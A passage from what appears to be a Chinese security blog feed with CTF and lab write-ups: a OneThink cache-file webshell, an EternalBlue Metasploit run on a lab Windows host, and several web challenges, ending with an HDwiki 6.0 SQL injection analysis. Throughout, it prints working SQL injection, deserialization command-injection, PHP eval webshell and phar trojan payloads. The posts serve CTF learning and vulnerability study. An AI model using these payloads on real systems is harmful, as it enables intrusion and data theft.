rel="noopener">http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/</a></strong></p><p>由于数据库长度限制，相继注册登录以下帐号</p><pre><code class="hljs php">%<span class="hljs-number">0</span>a$a=$_GET[a];<span class="hljs-comment">//</span>%<span class="hljs-number">0</span>aeval($a);<span class="hljs-comment">//</span>也可以注册%<span class="hljs-number">0</span>aecho `$a`;<span class="hljs-comment">//</span></code></pre><p><strong><a href="http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=system(%27ls%20/var/www/html%27)" target="_blank" rel="noopener">http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=system(%27ls%20/var/www/html%27)</a>;</strong><br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p><strong><a href="http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=highlight_file(%27/var/www/html/flag.php%27)" target="_blank" rel="noopener">http://84cf8ccedaec49dfa2db494ee0d066125a4116f5ee004d58.changame.ichunqiu.com/Runtime/Temp/2bb202459c30a1628513f40ab22fa01a.php?a=highlight_file(%27/var/www/html/flag.php%27)</a>;</strong><br><img src="./14.png" srcset="/img/loading.gif" alt=""></p><p>#　参考链接<br><a href="https://www.anquanke.com/post/id/152584" target="_blank" rel="noopener">OneThink1.0文件缓存漏洞分析及题目复现</a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.　动态调试的时候忘记在执行函数里下断点，造成debug无法跳入<br>2.　ThinkＰＨＰ框架还是不怎么娴熟，需要多学习</p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次简单渗透</title>
    <link href="/2019/05/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/"/>
    <url>/2019/05/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周开始第一次网络安全实验，实验过程比较乏味只是简单的x-scan端口扫描。遂利用漏洞报告做一次渗透测试。</p><h1 id="X-scan"><a href="#X-scan" class="headerlink" title="X-scan"></a>X-scan</h1><p>按照实验要求扫描了下隔壁机子<strong>192.168.20.54</strong><br><code>x-scan</code>扫描结果以html形式呈现，依据每个端口服务漏洞测试结果，进行渗透测试。<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞报告分析"><a href="#漏洞报告分析" class="headerlink" title="漏洞报告分析"></a>漏洞报告分析</h1><p>扫描结果显示靶机存在80端口开放，但登录靶机网站显示网站未被建设，遂不能利用。但更有价值的是本次扫描发现win主机存在大量netbios漏洞信息，且开放了<strong>139/445/135</strong>端口。这不经让人想起了<strong>ms17_010(永恒之蓝)</strong>漏洞，正是通过端口<strong>139/135/445</strong>进行攻击。</p><h1 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h1><p><strong>渗透机：deepin 172.31.19.5</strong></p><p><strong>靶机: win7 172.31.19.78</strong></p><p><strong>工具：nmap、Metasploit</strong></p><p>首先利用<strong>nmap</strong>扫描靶机开放端口服务，发现开放<strong>139/135/445</strong>端口服务<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>启动<strong>Metasploit</strong>控制台，使用<strong>ms17_010漏洞</strong></p><pre><code class="hljs bash">msf &gt; use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>并show options查看漏洞配置<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>设置渗透攻击目标IP地址，并执行</p><pre><code class="hljs bash">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class="hljs-built_in">set</span> rhost 172.31.19.78msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</code></pre><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>可以看到成功拿到<code>shell</code>,成功执行<code>ifconfig</code><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="防范措施："><a href="#防范措施：" class="headerlink" title="防范措施："></a>防范措施：</h1><ol><li>开启防火墙并定期更新漏洞补丁</li><li>如无必要，关闭135/139/445高危端口<br>未解决问题：靶机使用防火墙过滤端口，使用扫描导致失败，具体绕过还需要深入研究。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fafuCtf_WEB题解</title>
    <link href="/2019/04/28/fafuCtf-WEB%E9%A2%98%E8%A7%A3/"/>
    <url>/2019/04/28/fafuCtf-WEB%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>md5<strong>特性</strong>传入数组会报错。</p><pre><code class="hljs angelscript">payload:name[]=<span class="hljs-number">1</span>&amp;password[]=<span class="hljs-number">2</span></code></pre><p><code>flag{WelCome_To_Fafu_2019_ctf}</code></p><h1 id="login1"><a href="#login1" class="headerlink" title="login1"></a>login1</h1><p>该题存在BUG可以执行<code>LFI</code>，但是把源码都扒了，发现并不存在sql注入的信息。</p><p>扫描目录发现<code>.git</code>，使用<strong>githack</strong>还原<br><img src="./1.png" srcset="/img/loading.gif" alt=""><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h1 id="黑耀石浏览器"><a href="#黑耀石浏览器" class="headerlink" title="黑耀石浏览器"></a>黑耀石浏览器</h1><p>抓包返回头带<strong>hint: include($_GET[“file”])</strong></p><p>使用<code>php://filter</code>协议一个个扒源码<strong>index.php</strong>、<strong>class.php</strong></p><p>根据index.php结合class.php构造关于pass参数的反序列化</p><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">user</span>=php://<span class="hljs-keyword">input</span>&amp;file=<span class="hljs-keyword">class</span>.php&amp;pass=O:<span class="hljs-number">4</span>:"Read":<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">4</span>:"file";s:<span class="hljs-number">8</span>:"f1a9.php";&#125;</code></pre><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h1><ol><li>首先判断id是字符型还是整型=》id=2-1返回id=1内容</li><li>扔到burpsuite中进行fuzz发现过滤大量可用注入if,union…</li><li>添加单引号报错，猜测可以进行报错注入，正好extractvalue,updatexml未被过滤</li></ol><p>单纯使用报错语句会有<strong>32</strong>字符限制，会使得返回的信息不完整，但是这里又过滤了<code>concat</code>等字符拼接<br>可以参考文章：<a href="https://www.w3resource.com/mysql/string-functions/mysql-make_set-function.php" target="_blank" rel="noopener">https://www.w3resource.com/mysql/string-functions/mysql-make_set-function.php</a></p><h2 id="Payload："><a href="#Payload：" class="headerlink" title="Payload："></a>Payload：</h2><pre><code class="hljs llvm">http://<span class="hljs-number">172.31</span>.<span class="hljs-number">19.13</span>/?id=<span class="hljs-number">1</span>||<span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span>,(make_set(<span class="hljs-number">3</span>,<span class="hljs-symbol">%27</span>~<span class="hljs-symbol">%27</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>flag<span class="hljs-symbol">%20</span>from<span class="hljs-symbol">%20</span>flag))))</code></pre><p>其实直接用报错语句也可以</p><pre><code class="hljs llvm">http://<span class="hljs-number">172.31</span>.<span class="hljs-number">19.13</span>/?id=<span class="hljs-number">1</span>||<span class="hljs-keyword">extractvalue</span>(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-symbol">%20</span>flag<span class="hljs-symbol">%20</span>from<span class="hljs-symbol">%20</span>flag))</code></pre><h1 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h1><p>最近刷的Sql注入有点多<br><a href="https://zhzhdoai.github.io/2019/04/06/RingZer0-CTF-web-sql-WP/#Login-portal-2-%EF%BC%88sha1%E6%B3%A8%E5%85%A5%EF%BC%89">https://zhzhdoai.github.io/2019/04/06/RingZer0-CTF-web-sql-WP/#Login-portal-2-%EF%BC%88sha1%E6%B3%A8%E5%85%A5%EF%BC%89</a><br>bugku也有类似的</p><p>这题采过坑，爆出的密码为<strong>sha1</strong>，猜测后端逻辑是把从数据库<code>sha1</code>加密后的<code>password</code>与输入的<code>password</code>进行比较。</p><p>使用联合注入，即可得到结果</p><pre><code class="hljs crystal"><span class="hljs-symbol">payload:</span>username=admin’ <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">select</span> <span class="hljs-title">sha1</span>(1),<span class="hljs-title">sha1</span>(1)<span class="hljs-comment">#</span></span>password=<span class="hljs-number">1</span></code></pre><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h1 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h1><p>点击<strong>flag</strong>，发现参数page似乎有包含文件。但是尝试包含其他文件无果。<br>目录扫描采集信息<br>访问<code>http://172.31.19.53/www-zip</code>下载得到源码<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p><strong>Index.php</strong><br>参数$tip使用php伪协议POST <code>you got this</code>，</p><pre><code class="hljs groovy">tip=<span class="hljs-string">php:</span><span class="hljs-comment">//input</span>POST <span class="hljs-string">DATA:</span>you got <span class="hljs-keyword">this</span></code></pre><p>跟进<strong>class.php</strong>构造<code>$tips</code>反序列化</p><p><strong>class.php黑名单过滤了空格和linux部分命令，system方法处存在命令执行。</strong></p><pre><code class="hljs sas">Payload:/<span class="hljs-meta">index</span>.php?tip=php://<span class="hljs-meta">input</span><span class="hljs-variable">&amp;tips</span>=O:4:<span class="hljs-string">"Blog"</span>:1:&#123;s:4:<span class="hljs-string">"file"</span>;s:34:<span class="hljs-string">"Flag.php|ca''t$IFS./templates/Flag"</span>;&#125;///<span class="hljs-meta">index</span>.php?tip=php://<span class="hljs-meta">input</span><span class="hljs-variable">&amp;tips</span>=O:4:<span class="hljs-string">"Blog"</span>:1:&#123;s:4:<span class="hljs-string">"file"</span>;s:32:<span class="hljs-string">"Flag.php|rev$IFS./templates/Flag"</span>;&#125;///<span class="hljs-meta">index</span>.php?tip=php://<span class="hljs-meta">input</span><span class="hljs-variable">&amp;tips</span>=O:4:<span class="hljs-string">"Blog"</span>:1:&#123;s:4:<span class="hljs-string">"file"</span>;s:31:<span class="hljs-string">"Flag.php|c''at%09./templates/Flag"</span>;&#125;</code></pre><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><p>一些空白符在php中长度<br><a href="https://wayne173.iteye.com/blog/1471783" target="_blank" rel="noopener">https://wayne173.iteye.com/blog/1471783</a><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>这题是2018网鼎杯原题：<a href="https://mochazz.github.io/2018/08/21/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAWeb%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://mochazz.github.io/2018/08/21/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E4%B8%80%E5%9C%BAWeb%E9%A2%98%E8%A7%A3/</a></p><p><code>/view.php?no=1</code>参数存在Sql注入<br>依旧使用<strong>burpsuite</strong>FUZZ查找过滤字段</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs sql">http://172.31.19.15/view.php?no=21 || extractvalue(1,make_set(3,’~’,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())))[*] <span class="hljs-keyword">query</span> <span class="hljs-keyword">error</span>! (XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">'~,users'</span>)<span class="hljs-keyword">http</span>://<span class="hljs-number">172.31</span><span class="hljs-number">.19</span><span class="hljs-number">.15</span>/view.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">21</span>%<span class="hljs-number">20</span>||%<span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">make_set</span>(<span class="hljs-number">3</span>,%<span class="hljs-number">27</span>~%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>%<span class="hljs-number">20</span><span class="hljs-keyword">group_concat</span>(column_name)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span>information_schema.columns%<span class="hljs-number">20</span><span class="hljs-keyword">where</span>%<span class="hljs-number">20</span>table_name=%<span class="hljs-number">27</span><span class="hljs-keyword">users</span>%<span class="hljs-number">27</span>)))[*] <span class="hljs-keyword">query</span> <span class="hljs-keyword">error</span>! (XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">'~,no,username,passwd,data'</span>)<span class="hljs-keyword">http</span>://<span class="hljs-number">172.31</span><span class="hljs-number">.19</span><span class="hljs-number">.15</span>/view.php?<span class="hljs-keyword">no</span>=<span class="hljs-number">21</span>%<span class="hljs-number">20</span>||%<span class="hljs-number">20</span>extractvalue(<span class="hljs-number">1</span>,<span class="hljs-keyword">make_set</span>(<span class="hljs-number">3</span>,%<span class="hljs-number">27</span>~%<span class="hljs-number">27</span>,(<span class="hljs-keyword">select</span>%<span class="hljs-number">20</span><span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">data</span>)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span><span class="hljs-keyword">users</span>)))<span class="hljs-comment">#</span>[*] <span class="hljs-keyword">query</span> <span class="hljs-keyword">error</span>! (XPATH syntax <span class="hljs-keyword">error</span>: <span class="hljs-string">'~,O:8:"UserInfo":3:&#123;s:4:"name";s'</span>)</code></pre><p>数据库中存储<strong>data</strong>字段存储序列化字符串。而网页下方有显示当前博客地址，可能是对data字段值进行反序列化，并加载用户blog。存在<strong>ssrf</strong>。</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>:http://172.31.19.15/view.php?no=-1<span class="hljs-number">%20</span>union/**/select<span class="hljs-number">%201</span>,2,3,<span class="hljs-number">%27</span>O:8:<span class="hljs-number">%22</span>UserInfo<span class="hljs-number">%22</span>:3:&#123;s:4:<span class="hljs-number">%22</span>name<span class="hljs-number">%22</span>;s:4:<span class="hljs-number">%22</span>test<span class="hljs-number">%22</span>;s:3:<span class="hljs-number">%22</span>age<span class="hljs-number">%22</span>;s:2:<span class="hljs-number">%2212</span><span class="hljs-number">%22</span>;s:4:<span class="hljs-number">%22</span>blog<span class="hljs-number">%22</span>;s:29:<span class="hljs-number">%22</span>file:///var/www/html/flag.php<span class="hljs-number">%22</span>;&#125;<span class="hljs-number">%27</span>#</code></pre><p>PS:测试<code>http://172.31.19.15/flag.php</code>状态码<strong>200</strong>,该目录下存在<strong>flag.php</strong>文件<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p><code>ifram</code>标签回显<strong>blog</strong>内容,解码<code>base64</code>得flag<br><img src="./10.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第12届全国大学生信息安全竞赛_WEB</title>
    <link href="/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/"/>
    <url>/2019/04/25/%E7%AC%AC12%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-WEB/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>划水+1,激情复现</p><h1 id="JustSoso"><a href="#JustSoso" class="headerlink" title="JustSoso"></a>JustSoso</h1><p><strong>index.php</strong>文件中使用<code>parse_url</code>对解析url中是否存在Flag，使用<code>///</code>可绕过具体可参考：<a href="http://www.am0s.com/functions/406.html" target="_blank" rel="noopener">http://www.am0s.com/functions/406.html</a></p><p><strong>hint.php</strong>反序列化会先调用<code>__wakeup()</code>使得对象属性为NULL，绕过具体参考：<a href="https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/" target="_blank" rel="noopener">https://mochazz.github.io/2018/12/30/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bug/</a> </p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p>token_flag由于每执行一次getFLag使得与token值不等。</p><p>借用PHP变量引用，$this-&gt;token = &amp;$this-&gt;token_flag;即可绕过===判断<br>参考链接：<a href="https://blog.csdn.net/heiyeshuwu/article/details/748935" target="_blank" rel="noopener">https://blog.csdn.net/heiyeshuwu/article/details/748935</a></p><p>接着构造序列化。注意反序列化private特性生成的<code>\0</code><br>全程使用<code>python</code>进行解题，或者也可以手动添加<code>\0</code></p><pre><code class="hljs php">...$f= <span class="hljs-keyword">new</span> Flag(<span class="hljs-string">"flag.php"</span>);$f-&gt;token=&amp;$f-&gt;token_flag;$h= <span class="hljs-keyword">new</span> Handle($f);$h=serialize($h);var_dump($h);</code></pre><p>puython脚本运行结果如下<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h1 id="RefSpace"><a href="#RefSpace" class="headerlink" title="RefSpace"></a>RefSpace</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>robots.txt得到文件上传路径</li><li>构造路径其他路径包含，发现弹出可疑路径/ctf/</li><li>题目提示refname </li><li>伪协议读取index.php、、flag.php</li></ol><p>考点<code>refelect namespace</code>：<a href="https://php.net/manual/zh/language.namespaces.php" target="_blank" rel="noopener">https://php.net/manual/zh/language.namespaces.php</a></p><h2 id="Up10aD-php"><a href="#Up10aD-php" class="headerlink" title="Up10aD.php"></a>Up10aD.php</h2><p><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="phar一句话木马构造"><a href="#phar一句话木马构造" class="headerlink" title="phar一句话木马构造"></a>phar一句话木马构造</h2><pre><code class="hljs php">phar.php$p=<span class="hljs-keyword">new</span> PharData(dirname(<span class="hljs-keyword">__FILE__</span>).’/phartest.zip’,<span class="hljs-number">0</span>,’phartest’,Phar::ZIP);$x=file_get_content(‘./test.php’);$p-&gt;addFromString(‘test.php’,$x);<span class="hljs-comment">//文件重命名为phartest</span>test.php<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>($_GET[‘mima’]); <span class="hljs-meta">?&gt;</span></code></pre><p><img src="./5.png" srcset="/img/loading.gif" alt=""></p><p>使用上述方法借助<strong>app/Up10aD.php</strong>上传phar包，利用<strong>app/index.php</strong>文件包含，蚁剑连接<code>http://xxxx?route=phar://phartest.jpg/test</code></p><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h2 id="backup-zip中文件"><a href="#backup-zip中文件" class="headerlink" title="backup.zip中文件"></a>backup.zip中文件</h2><pre><code class="hljs php">我们的SDK通过如下SHA1算法验证key是否正确:<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">verify</span><span class="hljs-params">($key)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (sha1($key) === <span class="hljs-keyword">$this</span>-&gt;getHash()) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">"too&#123;young-too-simple&#125;"</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;&#125;如果正确的话，我们的SDK会返回flag。PS: 为了节省各位大佬的时间，特注明<span class="hljs-number">1.</span>此处函数<span class="hljs-keyword">return</span>值并不是真正的flag，和真正的flag没有关系。<span class="hljs-number">2.</span>此处调用的sha1函数为PHP语言内建的hash函数。(http:<span class="hljs-comment">//php.net/manual/zh/function.sha1.php)</span><span class="hljs-number">3.</span>您无须尝试本地解码或本地运行sdk.php，它被预期在指定服务器环境上运行。<span class="hljs-number">4.</span>几乎大部分源码内都有一定的hint，如果您是通过扫描目录发现本文件的，您可能还有很长的路要走。</code></pre><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过flag.php得到Flag的要求是满足<code>Verify()</code>方法中的<code>sha1()</code>判断。访问/ctf/目录看到sdk.php，文件相当于连接远程sdk的一个接口文件。题目提示可以想到考点是<code>refelect namespace</code></p><p><img src="./7.png" srcset="/img/loading.gif" alt=""></p><h2 id="PHP-SDK使用例子："><a href="#PHP-SDK使用例子：" class="headerlink" title="PHP SDK使用例子："></a>PHP SDK使用例子：</h2><p><a href="https://help.aliyun.com/document_detail/70057.html" target="_blank" rel="noopener">https://help.aliyun.com/document_detail/70057.html</a></p><h2 id="refelect-namespace"><a href="#refelect-namespace" class="headerlink" title="refelect namespace"></a>refelect namespace</h2><p>在upload目录下构造文件，使用<code>namespace interesting</code>引入模块，<br>重写<code>sha1()</code>方法，类优先调用本命名空间的同名函数优。</p><p>将如下代码写入<strong>app/flag.php</strong></p><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">interesting</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sha1</span><span class="hljs-params">($var)</span> </span>&#123; <span class="hljs-comment">// 调用类的私有、保护方法    </span>$class = <span class="hljs-keyword">new</span> \ReflectionClass(<span class="hljs-string">'interesting\FlagSDK'</span>);    $method = $class-&gt;getMethod(<span class="hljs-string">'getHash'</span>);    $method-&gt;setAccessible(<span class="hljs-keyword">true</span>);    $instance = $class-&gt;newInstance();    <span class="hljs-keyword">return</span> $method-&gt;invoke($instance);&#125;</code></pre><h2 id="DEMO实验"><a href="#DEMO实验" class="headerlink" title="DEMO实验"></a>DEMO实验</h2><p>可以发现<code>sha1()</code>算法执行之后与<code>send()</code>方法相同<code>md5</code>相同<br>值得注意的是这里<code>sha1</code>需要定义命名空间否则无法创建，会与php内置的方法冲突</p><p><img src="./8.png" srcset="/img/loading.gif" alt=""></p><h1 id="世界上最简单的sql"><a href="#世界上最简单的sql" class="headerlink" title="世界上最简单的sql"></a>世界上最简单的sql</h1><p>过滤：<code>| or sleep if benchmark case elt</code></p><p>题目要求输入帐号密码</p><p><strong>输入过滤字符或者单引号，提示数据库链接失败，但是仍然无法使用报错语句注入。</strong><br><strong>输入正确字符，提示登录失败！！！</strong></p><h2 id="DOUBLE型溢出"><a href="#DOUBLE型溢出" class="headerlink" title="DOUBLE型溢出"></a>DOUBLE型溢出</h2><p>power函数当第二个参数足够大，发生<code>Double</code>溢出，<code>mysql</code>报错。</p><p><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p><code>round()</code>中添加判断语句</p><pre><code class="hljs coq">为真=&gt;溢出为假=&gt;语法正确，返回<span class="hljs-number">1</span></code></pre><p><img src="./10.png" srcset="/img/loading.gif" alt=""></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre><code class="hljs sql">Payload:' ^ 1 and power((<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>()),<span class="hljs-keyword">round</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span> <span class="hljs-string">`2`</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>)a <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),%d,<span class="hljs-number">1</span>)=<span class="hljs-string">'%s'</span>)*<span class="hljs-number">1000</span>)<span class="hljs-comment">#"%(i,j)</span></code></pre><p>写脚本，爆破出数据出数据库名字，但是由于<code>or</code>过滤，无法使用<code>information</code>依次取表和列。</p><h2 id="无列名取值"><a href="#无列名取值" class="headerlink" title="无列名取值"></a>无列名取值</h2><p><strong>select /<code>1/</code> from (select 1,2,3 union select * from users)a;</strong></p><p><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>使用<code>select load_file(‘...’);</code>爆破文件无果，登录无果，脚本使用字符判断会忽略大小写问题，转用ASCII爆破。得到<code>F1AG@1s-at_/fll1llag_h3r3</code>。</p><pre><code class="hljs less"><span class="hljs-attribute">username</span>:admin<span class="hljs-attribute">password</span>:F1AG<span class="hljs-variable">@1s-at_</span>/fll1llag_h3r3</code></pre><p>登录成功之后，发现需要构造mysql伪服务器，读取文件。题目关了没复现完</p><h1 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h1><p><img src="./12.png" srcset="/img/loading.gif" alt=""></p><p><strong>环境:php&gt;7.0</strong><br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p><code>http://127.0.0.1/math.php?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=tac%20flag.php</code><br><strong>tac的功能是将文件从最后一行开始倒过来将内容数据输出到屏幕上</strong></p><p>payload等价：<code>$pi=_GET;($_GET[pi])($_GET[abs])</code><br><img src="./14.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/4906#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/4906#toc-10</a><br><a href="https://xz.aliyun.com/t/4904#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4904#toc-3</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HDwiki6.0_sql盲注</title>
    <link href="/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/"/>
    <url>/2019/04/25/HDwiki6-0-sql%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>漏洞触发：control/edition.php:147行</strong></p><h1 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h1><p>从index.php入口文件查看cms路由构造和全局变量过滤情况。</p><p>跟进model/hdwiki.class.php:86行</p><p><strong>第102行：只对get值进行过滤。</strong><br><strong>第107行：表明cms的路由情况。</strong></p><p>执行Payload类与方法调用情况根据第103行与<code>$control-&gt;$method();</code>进行</p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>所以漏洞触发点路由构造为:<code>http://127.0.0.1/cms/HDwiki6.0/hdwiki/index.php?edition-compare</code></p><p>跟进漏洞触发：<strong>control/edition.php:147行</strong>以post形式传入的参数只对键为0，1进行整数判断。<br>并通过<code>arrary_slice</code>取值传入sql中进行查询。</p><p><img src="./2.png" srcset="/img/loading.gif" alt=""></p><h2 id="array-slice"><a href="#array-slice" class="headerlink" title="array_slice"></a>array_slice</h2><pre><code class="hljs smali">array_slice (<span class="hljs-built_in"> array </span>$array ,<span class="hljs-built_in"> int </span>$offset [,<span class="hljs-built_in"> int </span>$length = NULL [, bool $preserve_keys = false ]] )<span class="hljs-keyword"> :</span> arrayarray_slice() 返回根据 offset 和 length 参数所指定的<span class="hljs-built_in"> array </span>数组中的一段序列。</code></pre><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>跟进model/doc.class.php:978行get_edition方法。当eid为数组直接传入，直接进行sql查询</p><p><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><pre><code class="hljs"><span class="hljs-keyword">POST</span> <span class="hljs-string">/cms/HDwiki6.0/hdwiki/?edition-compare</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">Referer</span>: http://127.0.0.1/cms/HDwiki6.0/hdwiki/?edition-compare<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded<span class="hljs-attribute">Cookie</span>: hd_sid=0thun8; hd_searchtime=1556181631; PHPSESSID=qpap19nk97soi6lfbo8ghp7oj2<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1<span class="hljs-attribute">Content-Length</span>: 78eid[2]=1&amp;eid[3]=1) or if(ascii(substr(user(),1,1))=115,1,0)#&amp;eid[0]=3&amp;eid[1]=4</code></pre><p><img src="./4.png" srcset="/img/loading.gif" alt=""><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接："><a href="#参考链接：" class="headerlink" 